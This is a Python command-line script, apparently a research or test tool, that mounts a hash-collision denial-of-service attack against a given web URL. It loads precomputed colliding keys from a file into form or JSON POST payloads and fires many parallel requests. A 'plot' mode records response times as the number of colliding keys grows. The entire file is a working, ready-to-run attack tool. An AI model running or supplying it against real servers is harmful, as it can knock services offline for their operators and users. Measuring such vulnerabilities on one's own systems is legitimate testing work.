#!/usr/bin/env python
"""Start a hash complexity attack
Usage:
    attack.py <url> <collisions> [--count <parallel_requests>] [--type <attack_type>] [--no-collide] [--shuffle]
    attack.py plot <url> <collisions> [--type <attack_type>] [--no-collide] [--shuffle]
    attack.py (-h | --help)

Options:
    -h --help                      Show this screen
    --count=<parallel_requests>    Amount of requests to make [default: 1]
    --type=<attack_type>           Use json or form attack [default: form]
    --no-collide                   Swap collision keys and values for comparison
    --shuffle                      Randomize order of keys
"""

import time
import sys
import json
import random
from collections import OrderedDict

import grequests
from docopt import docopt

def prepare_payload(collision_file, collide):
    # Payload has to contain the correct names
    # otherwise the request will fail because of an index out of bounds errors
    def collide_text():
        if collide:
            return "bad"
        else:
            return "good"

    print("Creating {0} payload".format(collide_text()))
    payload = {"name": "", "email": ""}
    with open(collision_file) as fh:
        for i, line in enumerate(fh):
            if collide:
                payload[line.strip()] = i
            else:
                payload[i] = line.strip()
    return payload


def shuffle_payload(payload):
    items = payload.items()
    random.shuffle(items)
    return OrderedDict(items)


def attack_with_form_fields(url, payload):
    return grequests.post(url, data=payload)


def attack_with_json_api(url, payload):
    return grequests.post(url, data=json.dumps(payload))


def make_requests(reqs):
    successful_responses = 0
    failed_responses = 0
    for resp in grequests.imap(reqs, stream=False, size=100):
        if resp.status_code == 200:
            successful_responses += 1
        else:
            failed_responses += 1
        resp.close()
    return successful_responses, failed_responses


def prepare_requests(url, payload, attack_type, shuffle):
    reqs = []

    for i in range(0, count):
        if shuffle and i % 10 == 0:
            payload = shuffle_payload(payload)
        if attack_type == "form":
            req = attack_with_form_fields(url, payload)
        if attack_type == "json":
            req = attack_with_json_api(url, payload)
        reqs.append(req)

    return reqs


if __name__ == "__main__":
    arguments = docopt(__doc__)
    url = arguments["<url>"]
    collision_file = arguments["<collisions>"]
    count = int(arguments['--count'])
    attack_type = arguments['--type']
    shuffle = arguments["--shuffle"]

    payload = prepare_payload(collision_file, not arguments['--no-collide'])

    def step_through(limit, callback):
        step = 10
        i = 0
        while i < limit:
            if step < 1000:
                step += 10
            else:
                step = 1000
            callback(i)
            i += step

    def limited_attack(index):
        items = payload.items()
        items = OrderedDict(items[:index])
        reqs = prepare_requests(url,
                                items,
                                attack_type=attack_type,
                                shuffle=shuffle)
        start = time.time()
        successful_responses, failed_responses = make_requests(reqs)
        end = time.time()
        request_time = end - start
        print("{0},{1},{2},{3}".format(index, request_time, successful_responses, failed_responses))

    def debug_attack():
        reqs = prepare_requests(url,
                                payload,
                                attack_type=attack_type,
                                shuffle=shuffle)
        print("Sent {0} {1} requests to {2} ".format(count, attack_type, url))
        print("Waiting for response of all requests...")
        start = time.time()
        successful_responses, failed_responses = make_requests(reqs)
        end = time.time()
        request_time = end - start
        print("Total time: {0} seconds".format(request_time))
        print("Successful: {0}".format(successful_responses))
        print("Failed: {0}".format((failed_responses)))

    if arguments["plot"]:
        print("{0},{1},{2},{3}".format("index", "request_time", "successful_responses", "failed_responses"))
        step_through(len(payload), limited_attack)
    else:
        debug_attack()
